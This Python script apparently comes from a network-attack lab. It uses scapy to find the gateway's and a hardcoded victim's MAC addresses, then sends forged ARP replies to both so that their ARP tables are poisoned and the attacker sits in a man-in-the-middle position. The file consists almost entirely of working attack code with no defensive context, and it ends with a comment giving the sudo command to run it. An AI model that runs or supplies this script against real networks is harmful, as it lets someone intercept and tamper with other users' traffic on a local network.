from scapy.all import *

# Attacker's addresses
ATTACKER_IP = "192.168.1.213"

# Victim's addresses
VICTIM_IP = "192.168.1.106"

def find_gateway():
    # use random IP outside the network to trace the route to the gateway
    random_IP = "123.123.123.000"
    return conf.route.route(random_IP)[2]

def find_mac(target_IP):
    broadcast = "ff:ff:ff:ff:ff:ff"

    # send ARP request to victim for MAC address
    arp_request = Ether(dst=broadcast)/ARP(pdst=target_IP)
    answered, unanswered = srp(arp_request, timeout=2, verbose=False)

    for sent, received in answered:
        if received.psrc == target_IP:
            return received.hwsrc

if __name__ == "__main__":
    gateway_ip = find_gateway()
    gateway_mac = find_mac(gateway_ip)
    print(f"[ARP Poison] The gateway of this network is at IP address {gateway_ip} and MAC address {gateway_mac}.")

    victim_mac = find_mac(VICTIM_IP)
    print(f"[ARP Poison] The victim at IP address {VICTIM_IP} is at MAC address {victim_mac}.")

    # forge ARP packet to victim pretending to be the gateway
    # hwsrc is automatically set to the MAC of the attacker.
    victim_packet = Ether(dst=victim_mac)/ARP(op="is-at", psrc=gateway_ip, pdst=VICTIM_IP, hwdst=victim_mac)
    sendp(victim_packet, verbose=False)
    print(f"[ARP Poison] ARP table of the victim has been poisoned.")
    
    # forge ARP packet to gateway pretending to be the victim. 
    # hwsrc is automatically set to the MAC of the attacker.
    gateway_packet = Ether(dst=gateway_mac)/ARP(op="is-at", psrc=VICTIM_IP, pdst=gateway_ip, hwdst=gateway_mac)
    sendp(gateway_packet, verbose=False)
    print(f"[ARP Poison] ARP table of the gateway has been poisoned.")

    print("Man in the Middle position has been established.")

    # sudo python3 arp_module.py
